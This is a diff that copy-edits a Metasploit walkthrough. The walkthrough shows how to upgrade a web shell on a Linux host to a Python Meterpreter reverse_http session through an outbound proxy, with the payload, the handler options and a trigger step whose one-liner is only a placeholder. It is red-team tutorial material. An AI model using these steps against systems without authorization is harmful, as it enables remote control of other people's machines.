@@ -1,10 +1,10 @@
 # Metasploit - Python Meterpreter through Proxy
 
-I got into a situation recently where I had a webshell on a Linux system and I wanted to get a full Meterpreter. Initially we thought that there was no outbound access but after a fellow teammate reversed some .jar files found on the system the proxy server was discovered. Basically now I needed a reverse shell that allowed me to specify a proxy for outbound connections. I sent a quick message to @TheColonial on IRC and he let me know that Python HTTP/HTTPS Meterpreters could do what I needed.
+I recently got into a situation where I had a web shell on a Linux system and wanted to get a full Meterpreter. Initially, we thought there was no outbound access, but a fellow teammate discovered a proxy server after reverse engineering some .jar files found on the system. Now I needed a reverse shell that allowed me to specify a proxy for outbound connections. I sent a quick message to @TheColonial on IRC, and he let me know that Python HTTP/HTTPS Meterpreters could do what I needed.
 
 ## Testing Python on the webshell
 
-First I used the webshell to test the ability to run Python
+First I used the web shell to test the ability to run Python
 
 ```python -c "import os;os.system('ls')"```
 
@@ -14,7 +14,7 @@ When this worked I moved onto generating the meterpreter payload:
 
 ```msf > use payload/python/meterpreter/reverse_http```
 
-Next I set my attack host ip address and the ip address of the outbound proxy:
+Next I set my attack host IP address and the IP address of the outbound proxy:
 
 ```
 msf payload(reverse_http) > show options
@@ -89,7 +89,7 @@ Exploit target:
    0   Wildcard Target
    
 ```
-There are a few additional options I set such as ExitOnSession to false so the handler remains open for multiple connections just in case the first one fails. Also I set verbose to true to get more verbose output for troublehsooting:
+I set a few additional options, such as ExitOnSession, to false so the handler remains open for multiple connections in case the first one fails. Also, I set verbose to true to get more verbose output for troubleshooting:
 
 ```
 msf exploit(handler) > set ExitOnSession false
@@ -98,7 +98,7 @@ msf exploit(handler) > set VERBOSE true
 verbose => true
 ```
 
-Lastly I start the handler with exploit -j so it runs in the background:
+Lastly, I start the handler with exploit -j, so it runs in the background:
 
 ```
 msf exploit(handler) > exploit -j
@@ -107,7 +107,7 @@ msf exploit(handler) > exploit -j
 
 ## Triggering the payload
 
-Next take the payload one liner that was generated and use python -c to trigger the payload in your webshell(Other forms of command execution could be potentially used to do this as well):
+Next take the payload one-liner that was generated and use python -c to trigger the payload in your web shell(Other forms of command execution could be potentially used to do this as well):
 
 ```
 python -c "*python meterpreter one liner*"
